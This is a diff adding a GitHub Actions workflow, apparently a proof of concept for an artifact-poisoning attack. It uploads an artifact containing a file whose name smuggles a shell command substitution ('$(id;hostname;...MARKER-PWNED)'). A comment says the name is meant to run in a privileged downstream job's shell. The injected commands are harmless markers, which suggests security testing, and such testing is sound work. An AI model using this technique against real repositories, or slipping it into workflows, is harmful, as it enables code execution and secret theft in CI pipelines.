@@ -1,0 +1,26 @@
+name: Test
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft artifact
+        env:
+          PR_NUMBER: ${{ github.event.number }}
+        run: |
+          mkdir -p out
+          echo "hello from forged artifact" > out/x.txt
+          printf '%s' "$PR_NUMBER" > out/pr_number.txt
+          # attacker-controlled file name carried into the privileged job's shell
+          : > 'out/$(id;hostname;echo${IFS}MARKER-PWNED).txt'
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out
